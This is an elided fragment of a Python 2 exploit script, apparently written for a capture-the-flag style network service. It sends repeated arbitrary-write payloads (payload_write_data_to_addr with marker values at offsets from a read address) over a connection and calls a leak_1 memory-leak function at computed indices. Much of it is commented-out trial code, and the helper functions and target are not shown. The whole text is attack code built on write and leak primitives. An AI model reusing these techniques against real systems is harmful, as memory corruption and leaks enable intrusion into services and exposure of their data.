...
# 		for a in range(11):
# 			ad = read_addr + (a)*144
# 			payload = payload_write_data_to_addr(0xaabbccdd, ad)
# 			send(conn, payload)

# 		payload = payload_write_data_to_addr(0xcafebeef, read_addr + (11)*144)
# 		send(conn, payload)
# 		payload = payload_write_data_to_addr(0xbad4beef, read_addr + (12)*144)
# 		send(conn, payload)
# 		payload = payload_write_data_to_addr(0xbad4beef, read_addr + (14)*144)
# 		send(conn, payload)
# 		payload = payload_write_data_to_addr(0xbad4beef, read_addr + (15)*144)
# 		send(conn, payload)

# 		# for a in range(16, 20):
# 		# 	payload = payload_write_data_to_addr(0xdeadcafe, read_addr + (a)*144)
# 		# 	send(conn, payload)
# 		print conn.recv()
# 		break
...
if len(word) == 1 and word[0] == '63':
	...
	for a in range(11):
		ad = read_addr + (a)*144
		payload = payload_write_data_to_addr(0xaabbcc00 + a, ad)
		send(conn, payload)
...
# print leak_1(1)
print leak_1((3*10)*36 + 1)
print leak_1((3*10)*36 + 1)
print leak_1((3*10)*36 + 1)
print leak_1((3*10)*36 + 1)
print leak_1((3*10)*36 + 1)
print leak_1((3*10)*36 + 1)
# print leak_1((3*10 + 2)*36 + 1)
# print leak_1((3*10 + 3)*36 + 1)
# print leak_1((3*10 + 4)*36 + 1)
# print leak_1((3*10 + 6)*36 + 1)
# print (1*40)*36 + 1
